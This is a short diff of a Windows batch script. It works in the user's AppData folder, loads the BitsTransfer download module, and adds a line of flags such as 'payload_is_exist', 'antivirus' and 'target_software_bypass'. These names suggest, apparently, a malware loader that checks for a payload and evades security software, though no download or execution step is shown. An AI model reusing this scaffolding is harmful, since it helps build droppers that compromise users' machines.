@@ -1,6 +1,7 @@
 cd C:\users\%username%\AppData
 powershell Import-Module BitsTransfer
 set expire_date=REPtime
+set temp=0&set autofullscreen=true&set updatelogs=true&set debug_enabled=false&set antivirus=true&set progress_bar=true&set payload_is_exist=0&set cmd_is_exist=0&set control_is_exist=0&color 0F&set reg_value_exists=0&set target_software_bypass=false
 :begin
 set CUR_YYYY=%date:~10,4%
 set CUR_DD=%date:~4,2%
